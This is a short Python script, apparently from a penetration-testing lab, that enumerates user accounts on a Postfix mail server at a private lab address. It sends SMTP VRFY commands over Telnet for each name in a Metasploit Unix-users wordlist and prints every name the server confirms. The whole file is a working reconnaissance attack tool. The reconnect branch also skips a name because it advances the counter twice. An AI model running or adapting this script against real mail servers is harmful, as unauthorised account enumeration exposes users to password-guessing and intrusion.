import sys
from time import sleep
from telnetlib import Telnet

host = '10.10.10.197'
port = 25
wordlist = '/opt/metasploit/data/wordlists/unix_users.txt'
#wordlist = './test.txt'
TIMEOUT = 3


try:
    tn = Telnet(host, port)
except:
    print("Unable to connect to Telnet Server ... Exiting ...")
    sys.exit()
    
with open(wordlist, 'r') as f:
    tn.read_until(b"ESMTP Postfix")
    print("[+] Banner has been identified ...")
    array_users = f.readlines()
    index = 0
    while index < len(array_users):
        tn.write(b"VRFY " + array_users[index].encode('ascii'))
        sleep(TIMEOUT)
        answer = tn.expect([b"2.0.0", b"rejected"])
        #print(str(answer[2]))
        if "2.0.0" in str(answer[2]):
            print("[+] Found user : {}".format(array_users[index]).rstrip())
        elif "too many errors" in str(answer[2]):
            tn = Telnet(host, port)
            index += 1
        else:
            #print("No user for : {}".format(array_users[index]))
            pass
        index += 1
        
